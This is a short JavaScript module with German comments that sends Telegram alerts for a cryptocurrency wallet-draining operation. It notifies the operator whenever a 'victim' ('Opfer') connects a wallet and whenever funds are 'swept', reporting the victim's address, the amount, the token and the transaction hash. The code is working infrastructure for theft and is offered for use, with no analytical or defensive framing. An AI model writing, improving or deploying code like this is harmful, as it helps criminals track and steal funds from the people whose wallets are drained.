// Telegram-Alarm: pingt dich bei jedem Opfer + jedem Sweep
// Setup: BotFather → /newbot → Token in config.json (telegramBotToken),
// dann deinem Bot schreiben, Chat-ID via https://api.telegram.org/bot<TOKEN>/getUpdates holen → telegramChatId
const fs = require('fs');
const path = require('path');

function loadCfg(){
  try{ return JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8')); }
  catch(e){ return {}; }
}

async function send(text){
  const cfg = loadCfg();
  if(!cfg.telegramBotToken || !cfg.telegramChatId) return false;
  try{
    const r = await fetch(`https://api.telegram.org/bot${cfg.telegramBotToken}/sendMessage`, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: cfg.telegramChatId, text, parse_mode: 'HTML' })
    });
    return r.ok;
  }catch(e){ return false; }
}

function alertConnect(victim){
  return send(`🎣 <b>Neuer Connect</b>\n<code>${victim}</code>\n<a href="https://etherscan.io/address/${victim}">Etherscan</a>`);
}

function alertSweep(info){
  const { type, victim, amount, token, txHash } = info;
  return send(`💰 <b>Sweep: ${type}</b>\nOpfer: <code>${victim}</code>\nBetrag: <code>${amount||'?'}</code>\nToken: <code>${token||'-'}</code>\nTX: ${txHash||'-'}`);
}

module.exports = { send, alertConnect, alertSweep };
